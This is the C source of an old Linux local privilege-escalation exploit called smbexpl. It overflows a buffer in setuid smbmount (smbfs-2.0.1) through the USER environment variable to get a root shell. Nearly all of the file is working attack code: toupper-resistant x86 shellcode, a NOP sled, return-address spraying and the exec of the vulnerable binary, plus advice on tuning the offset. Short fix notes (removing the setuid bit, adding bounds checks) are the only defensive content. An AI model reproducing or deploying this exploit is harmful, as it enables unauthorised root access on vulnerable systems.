
/*
The default parameters to the program
often work, however I have found that the offset parameter sometimes
varies wildly, values between -600 and -100 usually work though, a quick
shell script will scan through these.
*/

/*
** smbexpl -- a smbmount root exploit under Linux
**
** Author: Gerald Britton <gbritton@nih.gov>
**
** This code exploits a buffer overflow in smbmount from smbfs-2.0.1.
** The code does not do range checking when copying a username from
** the environment variables USER or LOGNAME.  To get this far into
** the code we need to execute with dummy arguments of a server and a
** mountpoint to use (./a in this case).  The user will need to create
** the ./a directory and then execute smbexpl to gain root.  This code
** is also setup to use /tmp/sh as the shell as bash-2.01 appears to
** do a seteuid(getuid()) so /bin/sh on my system won't work.  Finally
** a "-Q" (an invalid commandline argument) causes smbmount to fail when
** parsing args and terminate, thus jumping into our shellcode.
**
** The shellcode used in this program also needed to be specialized as
** smbmount toupper()'s the contents of the USER variable.  Self modifying
** code was needed to ensure that the shellcode will survive toupper().
**
** The quick fix for the security problem:
**          chmod -s /sbin/smbmount
**
** A better fix would be to patch smbmount to do bounds checking when
** copying the contents of the USER and LOGNAME variables.
**
*/

#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_OFFSET                 -202
#define DEFAULT_BUFFER_SIZE             211
#define DEFAULT_ALIGNMENT                 2
#define NOP                            0x90

/* This shell code is designed to survive being filtered by toupper() */

char shellcode[] =
        "\xeb\x20\x5e\x8d\x46\x05\x80\x08\x20\x8d\x46\x27\x80\x08\x20\x40"
        "\x80\x08\x20\x40\x80\x08\x20\x40\x40\x80\x08\x20\x40\x80\x08\x20"
        "\xeb\x05\xe8\xdb\xff\xff\xff"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/tmp/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int alignment=DEFAULT_ALIGNMENT;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
  if (argc > 3) alignment = atoi(argv[3]);
  printf("bsize=%d offset=%d alignment=%d\n",bsize,offset,alignment);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  fprintf(stderr,"Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) (ptr+alignment);
  for (i = 0; i < bsize-alignment; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + (128 - strlen(shellcode));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  setenv("USER",buff,1);
  execl("/sbin/smbmount","smbmount","//a/a","./a","-Q",0);
}
